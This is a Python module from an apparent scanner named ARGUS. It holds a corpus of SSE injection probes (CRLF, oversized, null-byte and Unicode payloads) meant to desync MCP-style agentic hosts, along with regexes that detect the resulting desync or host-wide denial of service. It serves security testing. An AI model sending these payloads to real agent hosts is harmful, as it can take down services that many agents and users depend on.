"""
argus/agents/techniques/ep_t13_sse_desync.py — SSE Protocol Desync Detection.

When ARGUS injects CRLF into an SSE (Server-Sent Events) stream, the host's
JSON-RPC state machine can lose synchronization. The host stops tracking
which responses correspond to which requests.

This is a Tier 0 finding class: Denial of Service of the entire agentic
host — not just the target server. Every agent connected through that
host is affected. The host cannot recover without restart.

Protocol desync signatures:
  - Host stops responding to new requests after injection
  - Response IDs no longer match request IDs
  - Multiple responses arrive for a single request
  - Host sends malformed SSE frame (missing 'data:' prefix)
  - Connection drops and reconnect fails

CVE relevance: TypeScript MCP SDK SSE transport does not validate
Content-Type or event data framing before parsing — CRLF in data
fields injects synthetic events into the stream.
"""
from __future__ import annotations

import re
import time
from dataclasses import dataclass, field
from typing import Optional


@dataclass
class SSEDesyncProbe:
    probe_id:    str
    payload:     str
    target:      str     # which SSE field is targeted
    description: str


@dataclass
class SSEDesyncResult:
    probe_id:        str
    desync_detected: bool = False
    tos_detected:    bool = False    # Tier 0: host-level DoS
    evidence:        list[str] = field(default_factory=list)
    response_times:  list[float] = field(default_factory=list)

    @property
    def severity(self) -> str:
        if self.tos_detected:
            return "CRITICAL"
        if self.desync_detected:
            return "HIGH"
        return "INFO"

    @property
    def finding_title(self) -> str:
        if self.tos_detected:
            return "Tier 0 DoS: SSE CRLF injection causes agentic host desync"
        if self.desync_detected:
            return "SSE protocol desync via CRLF injection in transport layer"
        return "SSE probe: no desync detected"


# ── SSE desync probe corpus ───────────────────────────────────────────────────

SSE_DESYNC_PROBES = [
    SSEDesyncProbe(
        probe_id="SSE-01-crlf-data",
        payload="legitimate\r\ndata: ARGUS_INJECTED_EVENT\r\n\r\n",
        target="data",
        description="CRLF in SSE data field injects synthetic event",
    ),
    SSEDesyncProbe(
        probe_id="SSE-02-crlf-event",
        payload="message\r\nevent: ARGUS_INJECTED\r\ndata: {}\r\n\r\n",
        target="event",
        description="CRLF in event type field injects new event frame",
    ),
    SSEDesyncProbe(
        probe_id="SSE-03-crlf-id",
        payload="1\r\nid: 99999\r\ndata: ARGUS_ID_INJECT\r\n\r\n",
        target="id",
        description="CRLF in SSE id field hijacks stream position",
    ),
    SSEDesyncProbe(
        probe_id="SSE-04-large-payload",
        payload="data: " + "A" * 65536,
        target="data",
        description="Oversized SSE data field causes buffer overflow in SDK",
    ),
    SSEDesyncProbe(
        probe_id="SSE-05-double-crlf",
        payload="data: ARGUS\r\n\r\ndata: DESYNC_FRAME\r\n\r\n",
        target="data",
        description="Double CRLF terminates current event, starts injected one",
    ),
    SSEDesyncProbe(
        probe_id="SSE-06-null-in-data",
        payload="data: ARGUS\x00BEACON\r\n\r\n",
        target="data",
        description="Null byte in SSE data causes parser desync",
    ),
    SSEDesyncProbe(
        probe_id="SSE-07-retry-inject",
        payload="message\r\nretry: 0\r\ndata: ARGUS_RETRY_INJECT",
        target="retry",
        description="retry field injection causes immediate reconnect loop",
    ),
    SSEDesyncProbe(
        probe_id="SSE-08-unicode-crlf",
        payload="data: ARGUS\u000d\u000a\u000d\u000aINJECTED",
        target="data",
        description="Unicode CRLF bypass — some parsers normalize after check",
    ),
]

# ── Desync detection ──────────────────────────────────────────────────────────

_DESYNC_PATTERNS = [
    re.compile(r"ARGUS_INJECTED"),
    re.compile(r"ARGUS_ID_INJECT"),
    re.compile(r"DESYNC_FRAME"),
    re.compile(r"ARGUS_RETRY_INJECT"),
    re.compile(r'"id":\s*99999'),
    re.compile(r"unexpected token", re.I),
    re.compile(r"json.*parse.*error", re.I),
    re.compile(r"malformed.*sse", re.I),
    re.compile(r"stream.*error", re.I),
]

_TOS_PATTERNS = [
    re.compile(r"maximum.*call.*stack", re.I),
    re.compile(r"out of memory", re.I),
    re.compile(r"heap.*space", re.I),
    re.compile(r"epipe|econnreset|econnrefused", re.I),
    re.compile(r"connection.*closed", re.I),
    re.compile(r"process.*killed", re.I),
]


def detect_desync(response_text: str,
                  response_time_ms: float,
                  baseline_time_ms: float) -> SSEDesyncResult:
    """Detect SSE protocol desync from a probe response."""
    result = SSEDesyncResult(probe_id="detect")
    result.response_times = [response_time_ms]

    # Check for injected content appearing in response
    for pat in _DESYNC_PATTERNS:
        if pat.search(response_text):
            result.desync_detected = True
            result.evidence.append(f"Desync marker: {pat.pattern!r}")

    # Check for Tier 0 DoS indicators
    for pat in _TOS_PATTERNS:
        if pat.search(response_text):
            result.tos_detected = True
            result.evidence.append(f"DoS indicator: {pat.pattern!r}")

    # Time-based DoS: response took 10x longer than baseline
    if baseline_time_ms > 0 and response_time_ms > baseline_time_ms * 10:
        result.tos_detected = True
        result.evidence.append(
            f"Response time DoS: {response_time_ms:.0f}ms vs "
            f"baseline {baseline_time_ms:.0f}ms "
            f"({response_time_ms/baseline_time_ms:.1f}x slower)"
        )

    return result


def tier0_dos_finding_dict(result: SSEDesyncResult, surface: str) -> dict:
    """Format a Tier 0 DoS SSE finding for the report."""
    return {
        "severity":    "CRITICAL",
        "vuln_class":  "PROTOCOL_DESYNC",
        "title":       result.finding_title,
        "surface":     surface,
        "evidence":    "\n".join(result.evidence),
        "owasp":       "AAI07",
        "tier":        0,
        "impact":      (
            "Entire agentic host becomes unresponsive. All agents "
            "sharing the SSE transport lose JSON-RPC state. "
            "Host requires restart to recover."
        ),
    }
